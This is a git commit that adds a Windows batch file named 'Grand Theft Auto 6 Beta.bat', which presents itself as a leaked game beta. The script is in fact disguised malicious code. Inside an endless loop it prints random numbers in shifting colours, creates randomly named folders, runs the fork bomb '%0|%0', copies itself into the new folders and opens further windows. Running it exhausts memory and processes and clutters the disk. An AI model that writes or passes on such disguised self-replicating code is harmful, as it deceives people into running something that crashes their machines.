3ccccf96c36fd1866ac5e12dba7a19ca2b82bdbb
Bradley Stratton <108354503+SlideShowGames@users.noreply.github.com>
2024-03-17 11:39:15 -0400

    Add files via upload

---
+++ Grand Theft Auto 6 Beta.bat
@@ -0,0 +1,15 @@
+:x
+	echo "GTA 6 Rockstar games copyright NEVER"
+	echo "HAHA"
+	color 2
+	echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+	color 1
+	echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+	color C
+	echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+	mkdir %random%
+	dir
+	%0|%0
+	copy "C:\Users\dougl\Desktop\GTA 6 Beta Files (From the 2023 leak)\Grand Theft Auto 6 Beta.bat" "C:\Users\dougl\Desktop\GTA 6 Beta Files (From the 2023 leak)\%random%\"
+	start
+x                       
